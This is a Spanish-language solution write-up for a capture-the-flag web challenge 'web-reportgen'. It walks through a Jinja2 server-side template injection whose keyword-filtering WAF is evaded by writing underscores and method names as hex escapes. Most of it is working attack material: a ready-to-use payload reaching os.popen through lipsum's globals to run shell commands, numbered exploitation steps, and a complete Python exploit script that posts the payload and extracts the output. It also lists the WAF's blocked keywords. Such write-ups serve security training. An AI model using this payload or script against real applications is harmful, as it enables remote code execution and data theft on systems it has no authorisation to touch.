# Solución — web-reportgen · Template Injection WAF

**Categoría:** web · **Dificultad:** insane · **Puntos:** 650 · **Vuln:** SSTI Jinja2 con WAF bypass mediante hex escapes

## Resumen

El servicio renderiza plantillas Jinja2 proporcionadas por el usuario. Un WAF intercepta la plantilla RAW antes de renderizarla y bloquea palabras clave SSTI. El bypass: Jinja2 procesa secuencias de escape `\xNN` en los strings del template, pero el WAF comprueba el string literal antes de ese procesamiento.

## La Vulnerabilidad

El WAF bloquea con `re.search`: `__class__`, `__globals__`, `__builtins__`, `popen`, `open`, `read`, etc.

El bypass: usar `\x5f` (hex de `_`) en lugar de `_`:
- WAF ve: `\x5f\x5fglobals\x5f\x5f` → sin match con `__globals__`
- Jinja2 procesa: `\x5f` → `_` → ejecuta como `__globals__`

## Payload de explotación

```
{{ lipsum['\x5f\x5fglobals\x5f\x5f']['os']['\x70\x6f\x70\x65\x6e']('cat /flag.txt')['\x72\x65\x61\x64']() }}
```

Desglose:
- `lipsum` → función global de Jinja2 (no bloqueada)
- `['\x5f\x5fglobals\x5f\x5f']` → `.__globals__` (WAF ve `\x5f\x5f`, no `__`)
- `['os']` → módulo os
- `['\x70\x6f\x70\x65\x6e']` → `.popen` (hex de `popen`, WAF no lo detecta)
- `('cat /flag.txt')` → ejecuta comando
- `['\x72\x65\x61\x64']()` → `.read()` (hex de `read`)

## Pasos de explotación

1. Visitar `http://<host>:8080/` y probar template básico
2. Intentar `{{ 7*7 }}` → confirmar SSTI (devuelve 49)
3. Intentar `{{ lipsum.__globals__ }}` → WAF bloquea `__globals__`
4. Aplicar bypass hex: `{{ lipsum['\x5f\x5fglobals\x5f\x5f'] }}` → pasa el WAF
5. Escalar a RCE completo con el payload de arriba

## Script de exploit

```python
#!/usr/bin/env python3
import sys, urllib.request, urllib.parse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

# Payload: lipsum.__globals__['os'].popen('cat /flag.txt').read()
# Con hex escapes para bypassear WAF
payload = "{{ lipsum['\\x5f\\x5fglobals\\x5f\\x5f']['os']['\\x70\\x6f\\x70\\x65\\x6e']('cat /flag.txt')['\\x72\\x65\\x61\\x64']() }}"

data = urllib.parse.urlencode({"template": payload}).encode()
req = urllib.request.Request(f"{TARGET}/render", data=data,
    headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST")

with urllib.request.urlopen(req) as resp:
    body = resp.read().decode()
    # Flag is in the rendered output in the page
    if "flag{" in body:
        start = body.find("flag{")
        end = body.find("}", start) + 1
        print(f"[FLAG] {body[start:end]}")
    else:
        print("[?] Respuesta:", body[body.find('<div class="output">'): body.find('<div class="output">') + 200])
```

## Por qué es INSANE

- El WAF bloquea todos los bypasses documentados con `__` literal
- Requiere conocer que Jinja2 procesa `\xNN` en template strings antes de evaluarlos
- La cadena `lipsum.__globals__` no es el vector obvio — requiere conocer los globals de Jinja2
- `popen` y `read` también deben estar hex-encoded

## Nota anti-cheat

La flag es dinámica y única por equipo. Compartir el método no da puntos.
